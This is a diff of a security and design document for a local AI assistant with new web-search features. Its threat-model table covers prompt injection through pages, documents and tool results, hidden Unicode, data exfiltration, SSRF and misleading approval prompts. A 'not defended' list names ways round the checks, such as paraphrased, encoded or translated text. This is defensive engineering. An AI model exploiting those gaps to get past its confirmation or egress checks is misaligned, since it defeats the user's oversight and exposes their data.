+  sealed at the start, as the voice clips are (`core/sealed.seal_in_place`). A document
+  uploaded for indexing is copied for its parser into `data/uploads/`, not the temp
+  folder every program on the account shares, and deleted after
+  (`api/uploads.private_copy`); copies a crash left there are swept at the start.
+- `connected.json`: the web's settings, with the Brave key sealed ([§12.12](#1212-the-web)).
 - `persona.json` and `policy.json` are written atomically (temp file + `os.replace`).
 - `voice_turns.jsonl` is append-only and not rotated; at roughly 150 bytes a turn it
   grows slowly.
@@ -4013,7 +4351,8 @@ allowed `Origin` or none (§18). Errors are typed (§5.4).
 | `POST /voices/{id}/activate` · `POST /voices/{id}/preview` · `DELETE /voices/{id}` | switch · preview (returns WAV) · delete |
 | `GET /persona` · `PUT /persona` · `POST /persona/reset` | personality |
 | `GET /capabilities` · `PUT /capabilities/{name}/policy` | capabilities and their modes |
-| `GET /capabilities/pending` · `POST /capabilities/confirm` | confirmations |
+| `GET /capabilities/pending` · `GET /capabilities/pending/{token}` · `POST /capabilities/confirm` | confirmations, one prompt's arguments in full, an answer |
+| `GET /connected` · `PUT /connected` · `PUT /connected/key` · `POST /connected/test` | the web's settings ([§12.12](#1212-the-web)) |
 | `GET /audit?limit=&offset=&capability=&decision=` | the audit log |
 | `GET /audit/verify` | whether its hash chain still adds up, and the first row that doesn't |
 | `POST /audit/review` | accept a break the person has looked at ([§12.6](#126-the-audit-log)) |
@@ -4075,7 +4414,7 @@ Everything published on the bus, by producer.
 | `memory.learning_mode` | `LearningController.set_mode` | `{mode}` |
 | `rag.updated` | `RagService` | `{}` |
 | `capability.requested` / `.completed` / `.denied` | kernel | capability, actor / ok, code, duration / code, reason |
-| `capability.confirm_required` | confirmation broker | `token, capability, summary, risk, actor, args_preview, expires_in_ms, why` |
+| `capability.confirm_required` | confirmation broker | `token, capability, summary, risk, actor, expires_in_ms, why, display` |
 | `capability.confirm_resolved` / `.confirm_expired` | confirmation broker | `{token, approved, via}` / `{token, reason}` |
 | `policy.changed` | `PolicyStore` | `{capability, mode}` |
 | `persona.changed` | `PersonaService` | `{personality}` |
@@ -4095,7 +4434,14 @@ the web pages the user visits, and text that tries to steer the model.
 |---|---|---|
 | A web page talking to `localhost:8000` | One exact Origin list for CORS, every WebSocket handshake (`accept_trusted` closes with 1008) and every non-GET request (the CSRF middleware); a missing Origin means a non-browser client | `core/origins.py`, `api/ws_guard.py`, `api/http_guards.py` |
 | DNS rebinding (a page re-pointing its own name at 127.0.0.1) | `HostGuard` answers only loopback host names, on HTTP and WebSockets, before anything else runs | `api/host_guard.py` |
-| Instructions hidden in a document, a file or a tool result | Untrusted text is fenced with a per-render random marker and labelled as data; titles are sanitised; the persona's tool rules repeat that tool output is not instructions. An action whose argument was copied word for word from any of it asks first, whatever its policy ([§12.4](#124-policy)) | `chat/context.py`, `tools/render.py`, `persona/defaults.py`, `kernel/taint.py` |
+| Instructions hidden in a document, a file, a page or a tool result | Untrusted text is fenced with a per-render random marker and labelled as data; titles are sanitised; the persona's tool rules repeat that tool output is not instructions. An action whose argument was copied word for word from any of it asks first, whatever its policy; in a turn that read the web, every action that isn't `safe` asks ([§12.4](#124-policy)) | `chat/context.py`, `tools/render.py`, `persona/defaults.py`, `kernel/taint.py`, `kernel/verdict.py` |
+| Text nobody sees: tag characters, bidi overrides, zero-width marks | Dropped from pages, search results and documents before the model reads them, and from the user's files all but what an edit needs; shown as `⟪U+…⟫` in prompts and in the chat's code and links; a file name holding one is refused | `core/text_safety.py`, `capabilities/paths.py`, `lib/reveal.ts` |
+| A page sending her data out | A call that reaches the network asks before an address nobody gave her, a secret or the user's own words leaves; ceilings per turn and per minute ([§12.4](#what-leaves-for-the-web)) | `kernel/egress.py`, `kernel/budget.py` |
+| A page pointing her at the user's network or her own backend (SSRF) | Only public addresses, none of this computer's or in the IPv6 /56 around it, checked on every hop and pinned for the connection; no credentials, cookies, proxies or kept connections; https never downgraded ([§12.12](#1212-the-web)) | `adapters/web/fetch.py`, `connected/runtime.py` |
+| A page built to exhaust her | Decompression in bounded steps against a 2 MB cap; a linear parser fed 524,288 characters at most, off the event loop; a 25 s deadline; search fields cut before they are read | `adapters/web/capped.py`, `page_text.py`, `search.py` |
+| A prompt that shows one thing and approves another | Hidden characters shown, the real host and file named, nothing cut without saying so, secrets blanked, Allow deaf for its first 500 ms ([§12.5](#125-confirmation)) | `kernel/display.py`, `shell/PermissionPrompts.tsx` |
+| Markup or code in what she shows | Everything reaches the screen as text React escapes, and a test fails on any way to turn a string into markup or code; the built page carries a Content-Security-Policy: the app's own scripts and styles only, no inline code or eval, connections to her backend only, no frames, objects, forms or base | `scripts/__tests__/sinks.test.ts`, `src/lib/csp.ts`, `vite.config.ts` |
+| A value becoming SQL | Every value goes in as a parameter; each statement built at run time is listed with what it interpolates, and a test fails on a new one until it is read | `tests/test_sql_safety.py` |
 | The model saying it did something it didn't | A reply's first-person action claims are read against what its turn ran; one nothing backed gets a caveat, shown or said with the reply and kept after it in the history the model reads next ([§12.10](#1210-what-she-says-she-did)) | `tools/claims.py` |
 | The model passing on a line written to her | A reply that repeats what a line addressed to her in what she read told her to tell the user gets a caveat saying so, the same way ([§12.11](#1211-what-she-passes-on)) | `tools/relayed.py` |
 | The model acting on its own | Every action goes through the kernel: policy, confirmation for anything that changes state (45 s, fails closed), an append-only, hash-chained audit row checked at every start | `kernel/` |
@@ -4104,8 +4450,8 @@ the web pages the user visits, and text that tries to steer the model.
 | Another account on the same computer reading or changing her data | First thing at every start, the data folder is made private (Windows: inheritance off, full control for the running account's SID, SYSTEM and Administrators, and every other entry removed; elsewhere mode 0700). Read and set as SDDL through the Windows API, so an account or group counts by its SID whatever the system's language calls it, and an entry for an account that no longer exists can't make the repair fail (it made icacls fail). The whole tree is checked, owners included (an owner can always change the permissions again), in 7 ms for a hundred and fifty entries; a repair resets whatever inside still grants someone else to inherit from the top and takes back what another account owns, never through a junction, a link or a file with a second name elsewhere, and goes on past what it can't change, failing at the end so the next start tries again. Paths past 260 characters are read. A network share or a drive without permissions is left as it is; a setting that names more than her data (a drive, the installation, the home folder, a folder Windows or other programs keep their things in, or one above them) is refused; every outcome is recorded in the black box; a folder it can't secure is said and the start goes on. A store given a place of its own outside the data folder keeps its folder's permissions ([§4](#4-configuration)) | `core/data_acl.py`, `core/win_security.py` |
 | Launching something other than the intended program | Allow-listed names only, resolved to an absolute path at startup (never from the current directory), no shell, no arguments | `capabilities/apps.py` |
 | Secrets being remembered or indexed | The sensitivity guard refuses them in memory, personality text and RAG chunks | `memory/sensitive.py` |
-| Secrets or personal details in logs and diagnostics | Audit arguments and details redacted; telemetry redacted on write, with the install and home folders hidden in paths; perf rows carry names and numbers only; `aiosqlite` kept out of DEBUG logs | `kernel/redaction.py`, `telemetry/redact.py`, `core/logging.py` |
-| The server reaching out on its own | Models open from disk only: `HF_HUB_OFFLINE` forced and `local_files_only` in every loader; downloading is a separate script the server never runs. The one other connection is Ollama on 127.0.0.1 | `adapters/model_files.py`, `main.py`, `scripts/install_models.py` |
+| Secrets or personal details in logs and diagnostics | Audit arguments and details redacted; telemetry redacted on write, with the install and home folders hidden in paths; perf rows carry names and numbers only; `aiosqlite` kept out of DEBUG logs; a failure in an action or the check before it, a web read, a chat turn, an activity-log write or the server's last-resort handler is logged by its type and where it happened, never its message, which can quote a key or an argument (`log_failure`) | `kernel/redaction.py`, `telemetry/redact.py`, `core/logging.py` |
+| The server reaching out on its own | Models open from disk only: `HF_HUB_OFFLINE` forced and `local_files_only` in every loader; downloading is a separate script the server never runs. With the web off, the one other connection is Ollama on 127.0.0.1; with it on, a search goes to the provider in Settings and a page is read from its site, only when she calls a tool for it | `adapters/model_files.py`, `main.py`, `scripts/install_models.py`, `capabilities/web.py` |
 | Oversized input | Row ids bounded to SQLite's range; every upload (a chat attachment, a document, a voice clip) read in chunks and refused past 25 MB, and a voice at 10 clips; a pasted document's body read no further than 50 MB before it is parsed; file reads and writes capped at 256 KB; a chat message refused by its length before it is read | `api/ids.py`, `api/uploads.py`, `capabilities/files.py`, `capabilities/files_write.py`, `chat/window.py` |
 
 What is **not** defended, stated plainly:
@@ -4116,7 +4462,7 @@ What is **not** defended, stated plainly:
   not software running as her. Windows keeps the account's own DPAPI keys on the same
   disk, protected by the account's password, so a stolen disk is kept out only as well
   as that password keeps it (an account with none keeps nothing out); BitLocker covers
-  the disk itself. Attachments and telemetry are not encrypted at rest. Without a
+  the disk itself. Her personality and telemetry are not encrypted at rest. Without a
   recovery key (§15.3), a reinstalled Windows or a reset account can't open her memory
   or her voices. Where there is no DPAPI (not Windows) nothing is encrypted, and she
   says so.
@@ -4127,8 +4473,10 @@ What is **not** defended, stated plainly:
   Settings shows when the current one was made.
 - Any program on the machine, under any account, can call the API while the backend
   runs: a request without an `Origin` is taken for a non-browser client, so it can read
-  what the routes return (memories, conversations, the audit log) and ask for actions,
-  which still need the user's approval. The private data folder doesn't cover this. The
+  what the routes return (memories, conversations, the audit log, a prompt's arguments
+  in full), ask for actions and answer their prompts itself, through the routes the
+  app's windows use (the activity log records such an answer as the app's). The private
+  data folder doesn't cover this. The
   fix is a per-launch token that only the desktop shell holds, which needs the shell to
   start the backend; the owner deferred it (2026-09-25).
 - The audit log can be rewritten by anyone with a SQLite shell; the triggers only stop
@@ -4138,12 +4486,29 @@ What is **not** defended, stated plainly:
   open is not caught.
 - Prompt-injection defences reduce the risk; they cannot remove it. That is why every
   action that changes something asks first, or, for saving and correcting a memory,
-  asks when its words came from something she read. A paraphrase gets past that check,
-  and nothing checks what she says: a planted claim can still colour her answers.
+  asks when its words came from something she read, or after the web. A paraphrase gets
+  past the copy check, and nothing checks what she says: a planted claim can still
+  colour her answers.
+- What she searches for is seen by the search provider (the user's SearXNG and its
+  upstream engines, or Brave), and a page she reads sees the request. The check on the
+  user's own words leaving reads words in order: encoded, reversed or translated text,
+  or fewer than four words, gets past it. For a page read, the rule on unfamiliar
+  addresses still keeps it from an attacker's server; a search has no address, so what
+  gets past the check in a query reaches the search provider.
 - An upload is capped while it is read, not before it arrives: the multipart parser has
   already spooled it to a temporary file, so the cap bounds memory, not disk.
-- The desktop shell ships with no Content-Security-Policy yet, and its default
-  capability grants more of Tauri's core API than the UI uses.
+- The Content-Security-Policy is set in the built page, not by the desktop shell, and
+  has no report-only mode: a packaged build must be checked by hand before a release.
+  The shell's default capability still grants more of Tauri's core API than the UI uses
+  (checking a narrower one needs the Rust toolchain).
+- On IPv6, a device on the user's network beyond the /56 around this computer (a
+  provider that gives a /48) counts as public, and so does the public IPv4 address a
+  router shares with everything behind it, which this computer can't see. On a network
+  that gives its computers public IPv4 addresses (some campuses and offices), the
+  computers beside this one count as public too.
+- The search provider's address in Settings can be any http(s) address, local ones
+  included, as a SearXNG instance usually is: any program that can call the API can
+  point it elsewhere, as it can change the rest of her settings.
 
 `SECURITY.md` has the reporting policy.
 
@@ -4241,9 +4606,21 @@ changing it:
   `npm run build` fails if a used animation has no keyframes.
 - The theme (`lib/theme.ts`) is System, Light or Dark, kept per computer in
   `localStorage` (`veronica.theme`) and applied as `data-theme` on `<html>`, which the
-  tokens' `light-dark()` values follow. `index.html` applies it before the first
-  paint; other windows follow through the `storage` event; transitions are paused for
-  the switch so every surface changes at once.
+  tokens' `light-dark()` values follow. `public/theme-init.js` applies it before the
+  first paint; other windows follow through the `storage` event; transitions are paused
+  for the switch (the `theme-switching` class) so every surface changes at once.
+- The built page opens with a Content-Security-Policy (`src/lib/csp.ts`, put in by
+  `vite.config.ts` at build only, since the dev server's hot reload runs inline code):
+  the app's own scripts, styles, fonts and images; voice samples from `blob:`;
+  connections to `http://localhost:8000`, `ws://localhost:8000` and the shell's `ipc:`;
+  no objects, frames, forms or `<base>`. So nothing inline: no `<script>` or `<style>`
+  in the page, no `<style>` made at run time, no asset inlined as `data:`
+  (`assetsInlineLimit: 0`). `npm run build` fails if the built page doesn't open with
+  it or holds anything it would refuse (`scripts/check-page.ts`).
+- What the app promises follows the setting, as her persona's line does: the line
+  under the chat box says nothing leaves while web search is off, what she looks up
+  goes to the search service while it is on, and only that she runs on this computer
+  while the setting is loading (`pages/Chat.tsx`).
 - Screens: **Chat** (the landing page), **Call**, **Voices**, **Memory**, **Settings**
   (General, Personality, Calls, Desktop, Privacy and About, addressed as
   `#/settings?section=…`), plus a separate **companion** route for the hotkey window. An
